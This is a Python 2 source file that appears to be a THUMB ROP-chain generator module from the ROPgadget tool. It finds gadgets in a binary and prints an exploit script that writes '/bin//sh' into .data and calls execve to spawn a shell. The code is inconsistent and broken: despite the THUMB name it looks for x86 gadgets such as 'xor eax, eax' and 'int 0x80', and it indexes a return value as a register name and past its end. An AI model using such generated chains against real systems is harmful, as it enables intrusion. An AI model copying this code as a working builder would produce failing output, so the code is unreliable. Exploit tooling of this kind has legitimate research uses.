#!/usr/bin/env python2
## -*- coding: utf-8 -*-
##  
##  Project owner: Jonathan Salwan
##  
##  Coded by alex.park
##
##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software  Foundation, either  version 3 of  the License, or
##  (at your option) any later version.
##

import re
from   capstone import *

class ROPMakerTHUMB:
    def __init__(self, binary, gadgets, liboffset=0x0):
        self.__binary  = binary
        self.__gadgets = gadgets

        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset

        self.__generate()

    def __lookingForPopPc(self, gadgetsAlreadyTested):
        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            #regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            # regex -> pop {r0,..., pc}
            regex = re.search("pop {r0,.*?, pc}$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[0]
                if lg:
                    regex = re.findall("{(.*?)}", lg)
                    if len(regex) > 0:
                        rv = regex[0].split(', ')
                        print rv
                    else:
                        # there is no result in gadget
                        continue
                try:
                    idx = 0
                    for r in rv:
                        if r == 'r0': continue
                        elif r == 'pc': continue
                        else:
                            idx = idx + 1

                    print "\t[+] Gadget found: 0x%x %s" %(gadget["vaddr"], gadget["gadget"])
                    return [gadget, idx]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print "\t[+] Gadget found: 0x%x %s" %(gadget["vaddr"], gadget["gadget"])
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    print "\tp += pack('<I', 0x%08x) # padding without overwrite %s" %(regAlreadSetted[reg], reg)
                except KeyError:
                    print "\tp += pack('<I', 0x41414141) # padding"

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr == None:
            print "\n[-] Error - Can't find a writable section"
            return

        print "\t#!/usr/bin/env python2"
        print "\t# execve generated by ROPgadget\n" 
        print "\tfrom struct import pack\n"

        print "\t# Padding goes here"
        print "\tp = ''\n"

        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
        print "\tp += pack('<I', 0x%08x) # @ .data" %(dataAddr)
        self.__padding(popDst, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
        print "\tp += '/bin'"
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr}) # Don't overwrite reg dst

        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
        self.__padding(write4where, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
        print "\tp += pack('<I', 0x%08x) # @ .data + 4" %(dataAddr + 4)
        self.__padding(popDst, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
        print "\tp += '//sh'"
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4}) # Don't overwrite reg dst

        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
        self.__padding(write4where, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
        self.__padding(popDst, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(xorSrc["vaddr"], xorSrc["gadget"])
        self.__padding(xorSrc, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
        self.__padding(write4where, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(popEbx["vaddr"], popEbx["gadget"])
        print "\tp += pack('<I', 0x%08x) # @ .data" %(dataAddr)
        self.__padding(popEbx, {})

        print "\tp += pack('<I', 0x%08x) # %s" %(popEcx["vaddr"], popEcx["gadget"])
        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
        self.__padding(popEcx, {"ebx": dataAddr}) # Don't overwrite ebx

        print "\tp += pack('<I', 0x%08x) # %s" %(popEdx["vaddr"], popEdx["gadget"])
        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
        self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx

        print "\tp += pack('<I', 0x%08x) # %s" %(xorEax["vaddr"], xorEax["gadget"])
        self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx

        for i in range(11):
            print "\tp += pack('<I', 0x%08x) # %s" %(incEax["vaddr"], incEax["gadget"])
            self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx

        print "\tp += pack('<I', 0x%08x) # %s" %(syscall["vaddr"], syscall["gadget"])

    def __generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print "\nROP chain generation\n==========================================================="

        print "\n- Step 1 -- Write-what-where gadgets\n"

        gadgetsAlreadyTested = []
        while True:
            write4where = self.__lookingForPopPc(gadgetsAlreadyTested)
            if not write4where:
                print "\t[-] Can't find the 'mov dword ptr [r32], r32' gadget"
                return

            popDst = self.__lookingForSomeThing("pop %s" %(write4where[1]))
            if not popDst:
                print "\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" %(write4where[1])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" %(write4where[2]))
            if not popSrc:
                print "\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" %(write4where[2])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" %(write4where[2], write4where[2]))
            if not xorSrc:
                print "\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" %(write4where[2], write4where[2])
                gadgetsAlreadyTested += [write4where[0]]
                continue
            else:
                break

        print "\n- Step 2 -- Init syscall number gadgets\n"

        xorEax = self.__lookingForSomeThing("xor eax, eax")
        if not xorEax:
            print "\t[-] Can't find the 'xor eax, eax' instuction"
            return

        incEax = self.__lookingForSomeThing("inc eax")
        if not incEax:
            print "\t[-] Can't find the 'inc eax' instuction"
            return

        print "\n- Step 3 -- Init syscall arguments gadgets\n"

        popEbx = self.__lookingForSomeThing("pop ebx")
        if not popEbx:
            print "\t[-] Can't find the 'pop ebx' instruction"
            return

        popEcx = self.__lookingForSomeThing("pop ecx")
        if not popEcx:
            print "\t[-] Can't find the 'pop ecx' instruction"
            return

        popEdx = self.__lookingForSomeThing("pop edx")
        if not popEdx:
            print "\t[-] Can't find the 'pop edx' instruction"
            return

        print "\n- Step 4 -- Syscall gadget\n"

        syscall = self.__lookingForSomeThing("int 0x80")
        if not syscall:
            print "\t[-] Can't find the 'syscall' instruction"
            return

        print "\n- Step 5 -- Build the ROP chain\n"

        self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)

